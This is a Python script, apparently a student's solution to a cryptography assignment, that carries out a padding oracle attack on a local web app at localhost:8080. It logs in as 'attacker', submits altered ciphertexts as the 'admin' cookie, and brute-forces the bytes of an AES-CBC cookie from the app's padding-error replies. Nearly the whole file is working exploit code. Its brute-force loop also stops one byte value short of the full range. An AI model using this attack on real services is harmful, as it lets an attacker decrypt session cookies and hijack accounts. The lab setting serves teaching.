import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend


from requests import codes, Session

import base64
import binascii
LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"


#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._backend = default_backend()
        self._block_size_bytes = int(ciphers.algorithms.AES.block_size/8)

    @property
    def block_length(self):
        return self._block_size_bytes

    

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self, ct):
        sess = Session()
        assert(do_login_form(sess, "attacker","attacker"))
        session_key = "admin"
        sess.cookies.set(name=session_key, value=ct.hex(), domain=sess.cookies.list_domains()[0])
        if "Bad padding for admin cookie!" in str(do_setcoins_form(sess, "attacker", 10).content):
            return False
        return True
   
def do_login_form(sess, username,password):
        data_dict = {"username":username,\
                "password":password,\
                "login":"Login"
			}
        response = sess.post(LOGIN_FORM_URL,data_dict)
        return response.status_code == codes.ok

    
def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response

def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    iv, c1 = list(split_into_blocks(ctx, po.block_length))
    msg = ''

    rand = bytearray(po.block_length)
    decrypted = bytearray(po.block_length)
    pad = 1

    for i in range (1, po.block_length + 1):
        # test every single byte possibility 0-256
        for brute_val in range(0XFF):
            rand[-pad] = brute_val
            test = rand +c1
            # if it is valid padding
            if po.test_ciphertext(test) == True:
                print("IN")
                # store the recovered byte
                decrypted[-pad] = pad ^ brute_val ^ iv[-i]
                # adjust padding for the next round
                for k in range(1, pad+1):
                    rand[-k] = pad+1 ^ decrypted[-k] ^ iv[-k]
                break 
        pad+=1
        print("DECRYPTED SO FAR:", decrypted)

    print("DECRYPTED 2BLOCK:", decrypted.decode())
    return decrypted.decode()


def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    # TODO: Implement padding oracle attack for arbitrary length message.
    msg = ""
    for i in range(nblocks - 1):
        
        c1 = ctx_blocks[i]
        c2 = ctx_blocks[i + 1]
        msg += po_attack_2blocks(po, c1 + c2)
        print("MESSAGE SO FAR:", msg)

    
    print("FINAL MESSAGE:", msg)
    
    return msg



if __name__=='__main__':
    cookie = po_attack(PaddingOracle(SETCOINS_FORM_URL), bytearray.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d"))
    print("DECODED", cookie)
